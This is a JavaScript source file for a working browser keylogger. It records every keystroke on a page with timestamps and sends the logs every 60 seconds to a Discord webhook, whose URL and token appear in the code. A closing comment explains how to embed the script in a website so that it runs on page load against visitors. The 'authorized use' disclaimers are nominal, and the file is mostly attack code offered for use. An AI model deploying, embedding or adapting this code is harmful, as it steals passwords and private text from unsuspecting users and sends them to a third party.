/*
  JavaScript Keylogger sending keystrokes as a text file to Discord webhook.
  Also provides a function to send arbitrary test results as message or file.

  Usage:
  1. Run this script in your page or browser console.
  2. You will be prompted once to enter the Discord webhook URL, saved in localStorage.
  3. It captures keystrokes, sends them every 60 seconds as a file.
  4. Call sendTestResults(yourText) to send test results to the webhook immediately.
  5. To reset webhook URL, clear localStorage item 'discordWebhookURL'.

  WARNING:
  Use only in controlled, authorized environments.
  */

(() => {
  const STORAGE_KEY = 'discordWebhookURL';

  async function getWebhookUrl() {
    let webhookUrl = localStorage.getItem(STORAGE_KEY);
    if (!webhookUrl) {
      webhookUrl = prompt('https://discord.com/api/webhooks/1379045425490821160/iW3FWcjdH93EZQk_peO_gtG4yammgx_zEYH9wpof4Klu8HB3CQnDHPNIdnyWXYzk9AsY:');
      if (webhookUrl) {
        localStorage.setItem(STORAGE_KEY, webhookUrl.trim());
      } else {
        alert('Webhook URL necessário para iniciar o keylogger. Abortando script.');
      }
    }
    return webhookUrl;
  }

  function formatKey(event) {
    const parts = [];
    if(event.ctrlKey) parts.push('Ctrl');
    if(event.shiftKey) parts.push('Shift');
    if(event.altKey) parts.push('Alt');
    if(event.metaKey) parts.push('Meta');

    let keyName = event.key;
    if(keyName === ' ') keyName = 'Space';
    if(keyName === 'Escape') keyName = 'Esc';
    if(keyName.length === 1) keyName = keyName.toUpperCase();

    parts.push(keyName);
    return parts.join(' + ');
  }

  async function sendToDiscord(payload, isFile = false, filename = 'file.txt') {
    const DISCORD_WEBHOOK_URL = await getWebhookUrl();
    if (!DISCORD_WEBHOOK_URL) return;

    let body;
    if (isFile) {
      const blob = new Blob([payload], { type: 'text/plain' });
      const formData = new FormData();
      formData.append('file', blob, filename);
      body = formData;
    } else {
      // Simple content JSON message
      body = JSON.stringify({ content: payload });
    }

    try {
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: body,
        headers: isFile ? undefined : { 'Content-Type': 'application/json' }
      });
      if (!response.ok) {
        console.error('Falha ao enviar para Discord:', response.status, response.statusText);
      } else {
        console.log('Mensagem enviada ao webhook do Discord com sucesso.');
      }
    } catch (error) {
      console.error('Erro ao enviar para Discord:', error);
    }
  }

  async function initKeylogger() {
    let capturedKeys = '';

    window.addEventListener('keydown', (event) => {
      // Comment out next line to avoid blocking default behavior
      // event.preventDefault();
      const timestamp = new Date().toLocaleTimeString();
      const keyCombo = formatKey(event);
      capturedKeys += `[${timestamp}] ${keyCombo}\n`;
    });

    async function sendCapturedKeys() {
      if (!capturedKeys) return;
      await sendToDiscord(capturedKeys, true, 'keylog.txt');
      capturedKeys = '';
    }

    setInterval(sendCapturedKeys, 60000); // send every 60 seconds

    console.log('Keylogger iniciado. Capturando teclas e enviando a cada 60 segundos ao Discord.');

    // Expose test results sender function globally
    window.sendTestResults = async function(text, sendAsFile = false, filename = 'test-results.txt') {
      if (!text) {
        console.warn('Nenhum texto fornecido para envio de resultados.');
        return;
      }
      await sendToDiscord(text, sendAsFile, filename);
    };

    console.log('Para enviar resultados de testes ao webhook, chame: sendTestResults(texto, sendAsFile=false, filename)');
  }

  initKeylogger();
})();

/*
How to embed and auto-run this script in a website:

1. Include the script in a <script> tag before closing </body>, inline or linking an external JS file.

Example (inline):

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Page with Keylogger</title>
</head>
<body>
  <h1>Minha página com keylogger</h1>
  <!-- Your page content -->

  <script>
    // Paste the entire script above here, or link as a separate .js file
  </script>
</body>
</html>

The script runs immediately on page load.

2. Alternatively, if loaded externally, add the script tag with src attribute:
<script src="keylogger_with_test_results_and_autorun.js"></script>

3. The webhook URL prompt happens once and is stored in localStorage. To reset, clear localStorage or call:
localStorage.removeItem('discordWebhookURL');

4. The script captures keystrokes globally while user is on page and sends logs every 60 sec.

5. You can send arbitrary test results anytime using browser console:
sendTestResults('Texto do resultado do teste');

Or as file:
sendTestResults('Conteúdo do arquivo de teste', true, 'teste.txt');

Note: Use ethically and only on authorized sites to comply with privacy laws.
*/

